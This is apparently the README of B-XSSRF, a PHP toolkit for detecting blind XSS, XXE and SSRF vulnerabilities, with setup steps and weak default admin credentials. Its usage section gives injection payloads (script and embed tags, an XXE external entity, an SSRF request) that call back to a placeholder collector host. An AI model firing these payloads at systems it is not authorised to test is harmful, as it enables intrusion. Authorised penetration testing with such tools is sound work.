<h1 align="center">
  <br>
  <a href=""><img src="https://github.com/SpiderMate/B-XSSRF/blob/master/img/icon.png" width="70" height="70" alt="B-XSSRF"></a>
  <br>
  B-XSSRF
  <br>
</h1>

<h4 align="center">Toolkit to detect and keep track on Blind XSS, XXE & SSRF</h4>

<p align="center">
  <a href="https://github.com/SpiderMate/PS-Ducky/releases">
    <img src="https://img.shields.io/badge/release-v1.0-blue.svg">
  </a>
  <a href="https://github.com/SpiderMate/PS-Ducky/issues">
    <img src="https://img.shields.io/badge/issues-0-red.svg">
  </a>
    <a href="https://github.com/SpiderMate/PS-Ducky/issues">
    <img src="https://img.shields.io/badge/php-5-green.svg">
  </a>
</p>

<img src="https://github.com/SpiderMate/B-XSSRF/blob/master/img/dashboard.png" alt="B-XSSRF">

### SETUP
- Upload the files to your server.
- Create a Database and upload <b>database.sql</b> file to it.
- Change the <b>DB Credentials</b> in <b>db.php</b> file.
- Ready.

### USAGE
BLIND XSS 

```
<embed src="http://mysite.com/bxssrf/request.php">
<script src="http://mysite.com/bxssrf/request.php">
```
BLIND XXE

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://mysite.com/bxssrf/request.php"> %ext;
]>
<r></r>
```
SSRF

```
GET /testssrf.php=http://mysite.com/bxssrf/request.php

```
### DEFAULT CREDENTIALS
```
USER : admin@test.com
PASS : 123456
```
